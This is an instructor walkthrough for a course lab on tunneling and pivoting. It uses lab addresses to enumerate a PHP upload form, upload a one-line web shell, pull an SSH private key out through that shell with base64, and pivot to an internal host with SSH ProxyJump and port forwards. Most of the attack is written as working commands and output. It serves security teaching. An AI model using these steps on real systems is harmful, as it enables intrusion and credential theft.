---
id: B02.M04.01-tunneling-pivot-walkthrough
title: 01-tunneling-pivot-walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
legacy_aliases:
- legacy/week2/labs/L2.11_Tunneling_Pivot/walkthroughs/01-tunneling-pivot-walkthrough.md
- B04.M09
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: course_internal
---
# L2.11 Walkthrough: Tunneling Pivot Lab

## Required Tools

* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (for web enumeration, upload probes, and HTTP GET verification)
* `gobuster` (for directory enumeration against the web root)
* `ssh` (for ProxyJump, local/remote port forwarding, and pivot access)
* `python3` (for `python3 -m http.server` image listeners)
* `nc` (Netcat — optional, for catching a reverse shell if you prefer that over a web shell)

## Deployment defaults

| Setting | Default |
|---|---|
| External subnet | `10.10.100.0/24` |
| External target | `10.10.100.110` |
| Target 1 internal | `172.16.222.10` |
| Target 2 internal | `172.16.222.100` |
| Status port range | `14000–14019` (instructor assigns one port per student) |
| Example assigned port | `14000` |

Edit [`config/lab-addresses.env.example`](../../../../../environments/b02_tunneling_pivot/config/lab-addresses.env.example) if your classroom remaps addresses.

---

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the external target subnet: `10.10.100.0/24`. We are positioned on the lab-facing ops network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 10.10.100.0/24 via 192.168.100.254
```

With connectivity available, perform a ping sweep to discover active hosts on the target subnet:

```bash
nmap -sn 10.10.100.0/24
```

*Output excerpt:*

```text
Nmap scan report for 10.10.100.110
Host is up (0.000018s latency).
```

**Observation:** One application host responds at **10.10.100.110** on the external segment.

**Inference:** Concentrate service enumeration on that address. Internal addresses (`172.16.222.0/24`) are not reachable directly from the ops station in this layout.

---

## 2. Service Enumeration

Scan the discovered host for open TCP ports and service versions:

```bash
nmap -Pn -sV -p- 10.10.100.110
```

*Output excerpt:*

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.x ((Debian))
```

**Observation:** **22/tcp** (SSH) and **80/tcp** (Apache) are open. No other application ports respond on the external interface.

**Inference:** The student-facing entry point is the web service on port 80. SSH may support operator access but is not the first exploitation surface without credentials.

### Initial Web Probing

```bash
curl -s -D - http://10.10.100.110/ -o /tmp/l211-index.html | head -12
cat /tmp/l211-index.html
```

*Header excerpt:*

```text
HTTP/1.1 200 OK
Server: Apache/2.4.x (Debian)
X-Powered-By: PHP/8.x
Content-Type: text/html; charset=UTF-8
```

*Body excerpt:*

```html
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
```

**Observation:** The root page is only a file upload form — no product name, help text, or navigation links.

**Inference:** Behavior after upload must be inferred from the response and follow-on HTTP probes, not from on-page hints.

### Upload Probe

```bash
printf 'marker-%s\n' "$(date +%s)" > /tmp/probe.txt
curl -s -F 'file=@/tmp/probe.txt;filename=probe.txt' http://10.10.100.110/
```

*Output:*

```text
SUCCESS
```

**Observation:** The server accepts the upload and prints **`SUCCESS`** only. No path, filename, or hyperlink is returned.

**Inference:** Uploaded files land somewhere under the web server, but the application deliberately hides the storage location. Next step: map web paths with directory enumeration and look for retrievable content.

---

## 3. Vulnerability Discovery

### Directory Enumeration — Finding `uploads/`

Brute-force common web paths with **gobuster** and Kali’s SecLists wordlist:

```bash
gobuster dir -u http://10.10.100.110/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --no-error
```

*`gobuster dir`* requests `GET /{word}` for each wordlist entry. *`-w`* selects the path list. *`--no-error`* suppresses transient connection noise.

*Output excerpt:*

```text
/uploads                (Status: 301) [Size: 312]
/index.php              (Status: 200) [Size: 156]
```

**Observation:** A path named **`/uploads`** responds with **301** (directory). The root **`/index.php`** matches the upload form.

**Inference:** Uploaded files likely land under `/uploads/`. Confirm by requesting the directory and looking for the earlier probe file.

```bash
curl -s http://10.10.100.110/uploads/
```

*Body excerpt (when directory listing is enabled on the target):*

```html
<a href="probe.txt">probe.txt</a>
```

**Observation:** The marker file **`probe.txt`** is visible inside **`/uploads/`**.

**Inference:** There is no upload filter blocking arbitrary extensions and no access control preventing retrieval of uploaded content. If the server executes PHP under `/uploads/`, a webshell upload is a credible next test — not because the form advertises it, but because storage is predictable and world-readable/listable.

### Failed Attempt: Expecting the Upload Response to Name the Path

It is easy to assume a bug or misconfiguration would leak the storage directory in the POST response:

```bash
curl -s -F 'file=@/tmp/probe.txt;filename=second.txt' http://10.10.100.110/ | od -c
```

*Output:*

```text
SUCCESS
```

*What we learned:* The application response is intentionally uninformative. Enumeration — not re-uploading — is required to locate stored files.

---

## 4. Exploit Preparation & Remote Access (Manual)

### Deploy a PHP Web Shell

Create a minimal execution primitive:

```bash
printf '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -F 'file=@/tmp/shell.php;filename=shell.php' http://10.10.100.110/
```

*Output:*

```text
SUCCESS
```

Verify execution:

```bash
curl -s --get --data-urlencode 'cmd=id' http://10.10.100.110/uploads/shell.php
```

*Output:*

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Observation:** The server executes PHP from **`/uploads/shell.php`**.

**Inference:** We have **`web-shell`** execution as **`www-data`** on the staging host. Use it for host survey and to hunt pivot material on the filesystem and under the document root.

### Host Context

```bash
curl -s --get --data-urlencode 'cmd=hostname' http://10.10.100.110/uploads/shell.php
curl -s --get --data-urlencode 'cmd=pwd' http://10.10.100.110/uploads/shell.php
```

*Output:*

```text
target1-staging
/var/www/html/uploads
```

### Discover Pivot Material — `super-secret-storage-directory/`

Survey the document root for directories not linked from the upload page:

```bash
curl -s --get --data-urlencode 'cmd=ls -la /var/www/html' \
  http://10.10.100.110/uploads/shell.php
```

*Output excerpt:*

```text
drwxr-xr-x 2 root root 4096 ... super-secret-storage-directory
drwxr-xr-x 2 www-data www-data 4096 ... uploads
-rw-r--r-- 1 root root  ... index.php
```

**Observation:** A directory named **`super-secret-storage-directory`** sits alongside **`uploads/`** and is not linked from **`index.php`**.

**Inference:** This is a deliberate hidden storage path — enumerate its contents before broader filesystem digging.

```bash
curl -s --get --data-urlencode 'cmd=ls -la /var/www/html/super-secret-storage-directory' \
  http://10.10.100.110/uploads/shell.php
```

*Output excerpt:*

```text
-rw------- 1 www-data www-data  ... id_ed25519
-rw-r--r-- 1 root     root     ... config
```

Retrieve the SSH client config (safe to read via shell):

```bash
curl -s --get --data-urlencode 'cmd=cat /var/www/html/super-secret-storage-directory/config' \
  http://10.10.100.110/uploads/shell.php
```

*Output:*

```sshconfig
Host internal-sync
    HostName 172.16.222.100
    User svc-sync
    IdentityFile ./id_ed25519
    StrictHostKeyChecking no
```

**Observation:** The config names an internal host **`172.16.222.100`**, user **`svc-sync`**, and a private key **`id_ed25519`** in the same directory.

**Inference:** Target 1 is dual-homed — this key is meant to pivot from the staging host (or through it) to an internal-only system. Copy the key material to your ops station for SSH client use.

Copy the private key to your ops station (example using the webshell and base64 — adjust if you prefer another exfil path):

```bash
curl -s --get --data-urlencode 'cmd=base64 -w0 /var/www/html/super-secret-storage-directory/id_ed25519' \
  http://10.10.100.110/uploads/shell.php | base64 -d > /tmp/id_ed25519
chmod 600 /tmp/id_ed25519
```

### Failed Attempt: Direct SSH to the Internal Host from the Ops Station

The config file names **`172.16.222.100`**. A natural test is direct SSH from the ops station:

```bash
ssh -i /tmp/id_ed25519 svc-sync@172.16.222.100
```

*Output excerpt:*

```text
ssh: connect to host 172.16.222.100 port 22: No route to host
```

*What we learned:* The internal host is not routed from the external ops network. Pivot **through** target 1 using **`ProxyJump`** or port forwarding.

---

## 5. Tunneling & Status Validation

The class status page ([`status/status.html`](../../../../../environments/b02_tunneling_pivot/status/status.html)) probes forty cells total:

* **Left 4×5 grid:** HTTP GET `http://172.16.222.10:<port>/pic.jpg` for ports `14000–14019`
* **Right 4×5 grid:** HTTP GET `http://127.0.0.1:<port>/pic.jpg` for the same ports

Cells stay **red** when the TCP connection is refused, turn **yellow** when a listener answers but `/pic.jpg` is not a loadable image, and display the image on success.

Confirm with your instructor:

1. Which **assigned port** you should use (example below: **`14000`**).
2. Which host runs **`status.html`** (the right grid probes **`127.0.0.1`** on *that* host).

### Step 5a — Reach the Internal Host via ProxyJump

From the ops station, chain through target 1:

```bash
ssh -i /tmp/id_ed25519 \
  -J www-data@10.10.100.110 \
  svc-sync@172.16.222.100
```

*`-J`* (**ProxyJump**) opens SSH to the jump host first, then connects to the internal target through that session.

If interactive login as **`www-data`** over SSH is disabled, use a local forward to internal SSH instead:

```bash
ssh -N -L 2222:172.16.222.100:22 www-data@10.10.100.110
ssh -i /tmp/id_ed25519 -p 2222 svc-sync@127.0.0.1
```

On the internal host, verify context:

```bash
hostname
whoami
ip -4 addr show
```

*Expected:* identity **`svc-sync`**, internal addressing on **`172.16.222.0/24`**, hostname distinct from target 1.

### Step 5b — Serve `pic.jpg` with `python3 -m http.server`

Copy the reference image (students may supply their own JPEG):

```bash
# On internal target after SSH login
mkdir -p /tmp/lab-image
cp /path/to/pic.jpg /tmp/lab-image/
cd /tmp/lab-image
python3 -m http.server 14000
```

*`python3 -m http.server`* serves the **current directory** over plain HTTP on the chosen port. A GET to **`/pic.jpg`** returns the file when it exists in that directory.

Verify on the internal host:

```bash
curl -s -D - "http://127.0.0.1:14000/pic.jpg" | head -8
```

*Output excerpt:*

```text
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.x
Content-type: image/jpeg
```

**Observation:** The listener answers **`GET /pic.jpg`** with **`200 OK`** and an image content type on the internal host.

**Inference:** Now bind that service into the tunnel paths the status page probes.

### Step 5c — Right Grid Tunnel (`127.0.0.1:<port>` on the status-page host)

When the status page runs on your ops station, forward local **`127.0.0.1:14000`** to the internal listener through target 1.

Terminal A — keep the internal HTTP server running (from Step 5b).

Terminal B — from the ops station:

```bash
ssh -N -L 127.0.0.1:14000:127.0.0.1:14000 \
  -J www-data@10.10.100.110 \
  svc-sync@172.16.222.100
```

Verify from the ops station (same host that will open **`status.html`** for the right grid):

```bash
curl -s -D - "http://127.0.0.1:14000/pic.jpg" | head -8
```

**Observation:** Local **`127.0.0.1:14000`** on the ops station now returns the JPEG.

**Inference:** The **right** grid cell for port **14000** should transition from red → image on the status display.

### Step 5d — Left Grid Tunnel (`172.16.222.10:<port>`)

The left grid probes target 1’s **internal** address. Bind a forward on that address on target 1 so it reaches the internal HTTP server.

From the ops station, open a remote forward through your SSH session to target 1 (requires **`GatewayPorts`** / bind permission on target 1 — confirm lab VM is configured accordingly):

```bash
ssh -N -R 172.16.222.10:14000:127.0.0.1:14000 www-data@10.10.100.110
```

When **`www-data`** cannot SSH interactively, run the remote forward from an existing root/web-shell session on target 1:

```bash
ssh -N -R 172.16.222.10:14000:172.16.222.100:14000 localhost
```

(Exact command depends on whether the forward originates on target 1 toward target 2 — adjust to match your VM’s SSH layout.)

Verify from a host that can reach **`172.16.222.10`** (often the status-page host on the internal LAN):

```bash
curl -s -D - "http://172.16.222.10:14000/pic.jpg" | head -8
```

**Observation:** HTTP GET to the **internal** staging address returns the same JPEG.

**Inference:** The **left** grid cell for port **14000** should display the image when the class status page polls that address.

### Step 5e — Open the Class Status Display

Open [`status/status.html`](../../../../../environments/b02_tunneling_pivot/status/status.html) in **Chromium** (or Google Chrome) on the host that can reach both probe targets. Edit the config block at the top if your addresses differ. Projection-host browser setup is in [README — Class status display](../README.md#class-status-display) (disable “Always use secure connections”).

Watch the assigned cell:

| State | Meaning |
|---|---|
| Red | No listener at that host:port |
| Yellow | Listener up, but `/pic.jpg` missing or not an image |
| Image visible | HTTP GET returned a loadable image — student tunnel success |

> **Instructor note:** If `python3 -m http.server` logs TLS/`\x16\x03\x01` **400** responses, or a cell stays red/yellow while `curl http://.../pic.jpg` succeeds, the projector is not using Chromium with secure-connection upgrades disabled (or Firefox is in use). Fix per [README — Class status display](../README.md#class-status-display), then reload.

**Success criterion for the lab:** the student’s assigned cell on the projected display shows their image.

---

## Troubleshooting

| Symptom | Likely cause | Check |
|---|---|---|
| Upload returns `SUCCESS` but no execution | PHP not enabled in `/uploads/` | Apache **`ScriptAlias` / handler** config; retest with **`curl`** against uploaded `.php` |
| `gobuster` finds no `/uploads` | Directory listing disabled; different path | Re-run with a larger wordlist; confirm upload via shell **`find /var/www/html`** after webshell |
| Direct internal SSH fails from ops | Expected — no route | Use **`-J`** / **`-L`** through **`10.10.100.110`** |
| `curl` to `127.0.0.1:14000` fails on ops station | Local forward not bound | Confirm **`-L 127.0.0.1:14000:...`** session is running |
| Left grid stays red | Forward not bound on **`172.16.222.10`** | Verify remote forward on target 1; test **`curl`** from internal LAN |
| Yellow cell | HTTP up, wrong path | Ensure **`pic.jpg`** is in the directory where **`http.server`** was started |
| Wrong cell updates | Port collision | Confirm instructor-assigned port; each student uses a distinct port |
| TLS/`\x16\x03\x01` **400** in `http.server`, or no image despite good `curl http://...` | Projector not on Chromium / “Always use secure connections” still on | Instructor: use Chromium per [README — Class status display](../README.md#class-status-display); reload after fixing |

---

## Target Access Enablement

| Repo path | Deploy to |
|---|---|
| `deploy/target1-var-www-html/*` | `/var/www/html/` on target 1 (external + internal interfaces) |
| `deploy/target2-authorized_keys` | `/home/svc-sync/.ssh/authorized_keys` on target 2 |
| `status/status.html` | Instructor projection host (Chromium/Chrome) |
| `deploy/reference/pic.jpg` | Optional copy for students / internal listener |

Tunables: [`config/lab-addresses.env.example`](../../../../../environments/b02_tunneling_pivot/config/lab-addresses.env.example)

Lab complete when the student’s assigned status cell displays their image on the class screen.
